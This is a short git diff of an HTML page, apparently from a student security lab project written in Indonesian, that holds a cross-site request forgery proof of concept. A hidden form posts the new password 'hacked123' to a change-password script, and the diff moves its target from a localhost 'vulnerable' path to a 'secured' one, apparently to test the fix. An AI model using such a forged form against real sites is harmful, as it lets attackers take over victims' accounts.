@@ -6,7 +6,7 @@
 <body>
     <h1>Serangan CSRF</h1>
     <p>Dengan mengklik tombol di bawah ini, password korban akan diubah menjadi "hacked123".</p>
-    <form action="http://localhost/FinproKemjar/vulnerable/process_change_password.php" method="POST">
+    <form action="http://localhost:8012/FinproKemjar/secured/process_change_password.php" method="POST">
         <input type="hidden" name="new_password" value="hacked123">
         <button type="submit">Luncurkan Serangan</button>
     </form>
